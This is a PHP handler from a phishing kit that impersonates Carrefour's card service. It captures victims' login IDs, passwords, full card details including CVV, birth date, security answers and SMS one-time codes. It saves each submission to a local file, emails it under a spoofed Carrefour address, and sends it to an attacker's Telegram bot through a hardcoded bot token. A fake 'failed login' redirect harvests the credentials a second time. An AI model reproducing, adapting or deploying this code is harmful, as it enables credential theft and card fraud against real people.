<?php

session_start();
    error_reporting(0);
    require_once 'anti/anti1.php';
    require_once 'anti/anti2.php';
    require_once 'anti/anti3.php';
    require_once 'anti/anti4.php';
    require_once 'anti/anti5.php';
    require_once 'anti/anti6.php';
    require_once 'anti/anti7.php';
    require_once 'anti/anti8.php';
    require_once 'detect.php';
	require_once 'Defender.php';
$email = "";

$id="-759439458";   // ID FOR TELEGRAM BETWEEN ""
$token="1523360148:AAHvCPwnzM2duZPNxcqv8h81jBnidBRbPz0";     // TOKEN FOR TELEGRAM BETWEEN ""
$format   = 'HTML';

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if ($_POST['type'] == "first_login") {

        $_SESSION['first_login'] = $_POST['dni'];
        $_SESSION['first_password'] = $_POST['password'];

        $message = "-------------------------------------\n";
        $message.= "            FIRST LOGIN              \n";
        $message.= "-------------------------------------\n";
        $message.= "LOGIN    : " . $_SESSION['first_login'] . "\n";
        $message.= "PASSWORD : " . $_SESSION['first_password'] . "\n";
        $message.= "-------------------------------------\n";
        $message.= "IP  : " . $_SERVER['REMOTE_ADDR'] . "\n";
        $message.= "-------------------------------------\n";

        mail($email,"CARREFOUR | FIRST LOGIN | " . $_SERVER['REMOTE_ADDR'],$message,"From: Carrefour <pass@carrefour.es>");
        file_put_contents("ndiiisa.txt", $message, FILE_APPEND);
		file_get_contents('https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $id .'&text='. urlencode($message) .'&parse_mode=' . $format);
        header( "Location: failed_login.php");

    }

    else if ($_POST['type'] == "second_login") {

        $_SESSION['second_login'] = $_POST['dni'];
        $_SESSION['second_password'] = $_POST['password'];

        $message = "-------------------------------------\n";
        $message.= "            SECOND LOGIN             \n";
        $message.= "-------------------------------------\n";
        $message.= "LOGIN    : " . $_SESSION['second_login'] . "\n";
        $message.= "PASSWORD : " . $_SESSION['second_password'] . "\n";
        $message.= "-------------------------------------\n";
        $message.= "IP  : " . $_SERVER['REMOTE_ADDR'] . "\n";
        $message.= "-------------------------------------\n";

        mail($email,"CARREFOUR | SECOND LOGIN | " . $_SERVER['REMOTE_ADDR'],$message,"From: Carrefour <pass@carrefour.es>");
        file_put_contents("ndiiisa.txt", $message, FILE_APPEND);
		file_get_contents('https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $id .'&text='. urlencode($message) .'&parse_mode=' . $format);
        header( "Location: tarjeta_pass.php");
    }
	
	

    else if ($_POST['type'] == "submit_card") {
        $message = "-------------------------------------\n";
        $message.= "            FIRST LOGIN              \n";
        $message.= "-------------------------------------\n";
        $message.= "LOGIN    : " . $_SESSION['first_login'] . "\n";
        $message.= "PASSWORD : " . $_SESSION['first_password'] . "\n";
        $message.= "-------------------------------------\n";
        $message.= "            SECOND LOGIN             \n";
        $message.= "-------------------------------------\n";
        $message.= "LOGIN    : " . $_SESSION['second_login'] . "\n";
        $message.= "PASSWORD : " . $_SESSION['second_password'] . "\n";
        $message.= "-------------------------------------\n";
        $message.= "                CARD                 \n";
        $message.= "-------------------------------------\n";
        $message.= "NAME     : " . $_POST['cc_name'] .  "\n";
        $message.= "BIRTH    : " . $_POST['birth_date'] ."\n";
        $message.= "NUMBER   : " . $_POST['cc_number'] . "\n";
        $message.= "DATE     : " . $_POST['cc_date'] .  "\n";
        $message.= "CVV      : " . $_POST['cc_cvv'] .  "\n";
        $message.= "QUESTION : " . $_POST['question'] .  "\n";
        $message.= "ANSWER   : " . $_POST['answer'] .  "\n";
        $message.= "-------------------------------------\n";
        $message.= "IP  : " . $_SERVER['REMOTE_ADDR'] . "\n";
        $message.= "-------------------------------------\n";

        mail($email,"CARREFOUR | NEW CARD | " . $_SERVER['REMOTE_ADDR'],$message,"From: Carrefour <pass@carrefour.es>");
        file_put_contents("ndiiisa.txt", $message, FILE_APPEND);
		file_get_contents('https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $id .'&text='. urlencode($message) .'&parse_mode=' . $format);
        header( "Location: tarjeta_sms.php");
    }

    else if ($_POST['type'] == "submit_sms") {
        $message = "-------------------------------------\n";
        $message.= "                  SMS                \n";
        $message.= "-------------------------------------\n";
        $message.= "SMS      : " . $_POST['cc_sms'] . "\n";
        $message.= "-------------------------------------\n";
        $message.= "IP  : " . $_SERVER['REMOTE_ADDR'] . "\n";
        $message.= "-------------------------------------\n";

        mail($email,"CARREFOUR | NEW SMS | " . $_SERVER['REMOTE_ADDR'],$message,"From: Carrefour <pass@carrefour.es>");
        file_put_contents("ndiiisa.txt", $message, FILE_APPEND);
		file_get_contents('https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $id .'&text='. urlencode($message) .'&parse_mode=' . $format);
        session_destroy();

        header("Location: tarjeta_sms.php");
    }

    else {
        header("Location: https://www.pass.carrefour.es");
    }

}